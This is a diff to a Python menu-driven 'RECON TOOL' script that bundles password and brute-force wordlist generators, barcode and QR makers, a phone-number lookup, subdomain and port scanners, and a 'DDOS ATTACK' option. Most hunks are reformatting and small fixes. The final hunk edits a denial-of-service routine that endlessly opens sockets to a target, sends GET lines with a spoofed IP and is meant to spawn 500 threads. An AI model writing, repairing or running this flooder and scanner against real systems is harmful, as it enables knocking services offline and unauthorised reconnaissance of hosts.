@@ -8,7 +8,7 @@ import random
 import itertools
 import sys
 import pyqrcode
-from barcode import EAN13
+from barcode import EAN14
 from queue import Queue
 import threading
 from barcode.writer import ImageWriter
@@ -22,7 +22,8 @@ from tabulate import tabulate
 result = pyfiglet.figlet_format("RECON TOOL", font="slant")
 print(result)
 
-options = ("\n1- MY IP ADDRESS \n 2- PASSWORD GENERATOR \n 3- WORDLIST GENERATOR \n 4- BARCODE GENERATOR \n 5- QRCODE GENERATOR \n 6- PHONE NUMBER INFO \n 7- SUBDOMAIN SCANNER \n 8- PORT SCANNER \n 9- DDOS ATTACK \n")
+options = (
+    "\n1- MY IP ADDRESS \n 2- PASSWORD GENERATOR \n 3- WORDLIST GENERATOR \n 4- BARCODE GENERATOR \n 5- QRCODE GENERATOR \n 6- PHONE NUMBER INFO \n 7- SUBDOMAIN SCANNER \n 8- PORT SCANNER \n 9- DDOS ATTACK \n")
 
 print(options)
 select = int(input("ENTER YOUR CHOICE "R""">>>>---------->"""))
@@ -57,9 +58,7 @@ match select:
             print("YOUR ip address IS:" + IPAddr)
             raw_input("PRESS ENTER TO EXIT")
 
-
     case 2:
-
 
         def loading():
             for _ in tqdm(range(100), desc="LOADING....", ascii=False, ncols=75):
@@ -93,11 +92,11 @@ match select:
                 password = "".join(random.sample(all, length))
                 print(" GENERATED PASSWORD OF LENGTH", length, " is " r""">>>>-------->""")
 
+
             get_random_string(length)
             raw_input("PRESS ENTER TO EXIT")
 
     case 3:
-
 
         def loading():
             for _ in tqdm(range(100), desc="LOADING....", ascii=False, ncols=75):
@@ -132,19 +131,19 @@ match select:
                 ans = mtl ** ltp
                 p.append(ans)
                 tline = sum(p)
-                raw_input ('ARE YOU READY ? [PRESS Enter]')
+                raw_input('ARE YOU READY ? [PRESS Enter]')
                 time1 = time.asctime()
                 start = time.time()
                 psd = open(zt, 'a')
 
-                for i in range (k, n):
+                for i in range(k, n):
                     r = i * 100 / n
                     l = str(r) + ' percent '
                     sys.stdout.write("\r%s" % 1)
                     sys.stdout.flush()
                     psd.flush()
 
-                    for xs in itertools.product(chrs, repeat = i):
+                    for xs in itertools.product(chrs, repeat=i):
                         psd.write(''.join(xs) + '\n')
                         psd.flush()
 
@@ -176,8 +175,9 @@ match select:
 
 
         def generator(number):
-            my_code = EAN13(number, writer=ImageWriter)
-            my_code.saver("bar_code")
+            my_code = EAN14(number, writer=ImageWriter)
+            my_code.save("bar_code")
+
 
         if __name__ == "__main__":
             window_size(80, 20)
@@ -190,73 +190,71 @@ match select:
             generator(innumber)
             raw_input("Press enter to exit")
 
-
     case 5:
-            def loading():
-                for _ in tqdm(range(100), desc="LOADING....", ascii=False, ncols=60):
-                    time.sleep(0.01)
-                print("LETS MOVE")
+        def loading():
+            for _ in tqdm(range(100), desc="LOADING....", ascii=False, ncols=60):
+                time.sleep(0.01)
+            print("LETS MOVE")
 
 
-            def font(text):
-                cool_text = Figlet(font="slant")
-                return str(cool_text.renderText(text))
+        def font(text):
+            cool_text = Figlet(font="slant")
+            return str(cool_text.renderText(text))
 
 
-            def window_size(columns=750, height=30):
-                os.system("cls")
-                os.system(f'mode con: cols={columns} lines={height}')
+        def window_size(columns=750, height=30):
+            os.system("cls")
+            os.system(f'mode con: cols={columns} lines={height}')
 
 
-            if __name__ == "__main__":
-                window_size(80, 20)
-                print(font("QRCODE GENERATOR"))
-                loading()
-                print("GENERATED QR CODE WILL BE SAVED AS myqr.png IN THE PRESENT DIRECTORY")
+        if __name__ == "__main__":
+            window_size(80, 20)
+            print(font("QRCODE GENERATOR"))
+            loading()
+            print("GENERATED QR CODE WILL BE SAVED AS myqr.png IN THE PRESENT DIRECTORY")
 
-                s = input("ENTER THE LINK TO CREATE A QRCODE "r""">>>>----------->""")
-                url = pyqrcode.create(s)
-                url.svg("myqr.svg", scale=8)
-                url.png("myqr.png", scale=6)
-                raw_input("Press enter to exit")
-
+            s = input("ENTER THE LINK TO CREATE A QRCODE "r""">>>>----------->""")
+            url = pyqrcode.create(s)
+            url.svg("myqr.svg", scale=8)
+            url.png("myqr.png", scale=6)
+            raw_input("Press enter to exit")
 
     case 6:
-            def loading():
-                for _ in tqdm(range(100), desc="LOADING....", ascii=False, ncols=60):
-                    time.sleep(0.01)
-                print("LETS MOVE")
+        def loading():
+            for _ in tqdm(range(100), desc="LOADING....", ascii=False, ncols=60):
+                time.sleep(0.01)
+            print("LETS MOVE")
 
 
-            def font(text):
-                cool_text = Figlet(font="slant")
-                return str(cool_text.renderText(text))
+        def font(text):
+            cool_text = Figlet(font="slant")
+            return str(cool_text.renderText(text))
 
 
-            def window_size(columns=750, height=30):
-                os.system("cls")
-                os.system(f'mode con: cols={columns} lines={height}')
+        def window_size(columns=750, height=30):
+            os.system("cls")
+            os.system(f'mode con: cols={columns} lines={height}')
+
+
+        if __name__ == "__main__":
+            window_size(80, 20)
+            print(font("Phone Number Scanner"))
+            loading()
+
+
+            def num_scanner(phn_num):
+                number = phonenumbers.parse(phn_num, "IN")
+                description = geocoder.description_for_number(number, 'en')
+                supplier = carrier.name_for_number(number, 'en')
+                info = [["country", "SUPPLIER"], [description, supplier]]
+                data = str(tabulate(info, headers="firstrow", tablefmt="github"))
+                return data
 
 
             if __name__ == "__main__":
-                window_size(80, 20)
-                print(font("Phone Number Scanner"))
-                loading()
-
-
-                def num_scanner(phn_num):
-                    number = phonenumbers.parse(phn_num)
-                    description = geocoder.description_for_number(number, 'en')
-                    supplier = carrier.name_for_number(number, 'en')
-                    info = [["country", "SUPPLIER"],[description, supplier]]
-                    data = str(tabulate(info, headers="firstrow", tablefmt="github"))
-                    return data
-
-                if __name__ == "__main__":
-                    number = input("ENTER THE NUMER"r""">>>>-------->""")
-                    print(num_scanner(number))
-                    raw_input("PRESS ENTER TO EXIT")
-
+                number = input("ENTER THE NUMER"r""">>>>-------->""")
+                print(num_scanner(number))
+                raw_input("PRESS ENTER TO EXIT")
 
     case 7:
 
@@ -321,6 +319,7 @@ match select:
             except:
                 return False
 
+
         def get_ports(mode):
             if mode == 1:
                 for port in range(1, 1024):
@@ -339,12 +338,14 @@ match select:
                 for port in ports:
                     queue.put(port)
 
+
         def worker():
             while not queue.empty():
                 port = queue.get()
                 if portscan(port):
                     print("Port {} is open!".format(port))
                     open_ports.append(port)
+
 
         def run_scanner(threads, mode):
 
@@ -362,6 +363,7 @@ match select:
                 thread.join()
 
             print("open ports are:", open_ports)
+
 
         if __name__ == "__main__":
             window_size(80, 20)
@@ -401,6 +403,7 @@ match select:
             fake_ip = '181.4.20.196'
             already_Connected = 0
 
+
             def attack():
                 while True:
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -408,12 +411,13 @@ match select:
                     s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
                     s.sendto(("GET /" + fake_ip + "HTTP/1.1\r\n").encode('ascii'), (target, port))
                     s.close()
-                    global already_connected
-                    already_connected += 1
-                    if already_connected % 500 == 0:
-                        print(already_connected)
+                    global already_Connected
+                    already_Connected += 1
+                    if already_Connected % 500 == 0:
+                        print(already_Connected)
 
-                    for i in range(500):
-                        thread = threading.Thread(target=attack)
-                        thread.start()
-                        raw_input("PRESS ENTER TO EXIT")
+            for i in range(500):
+                thread = threading.Thread(target=attack())
+                thread.start()
+
+            raw_input("PRESS ENTER TO EXIT")
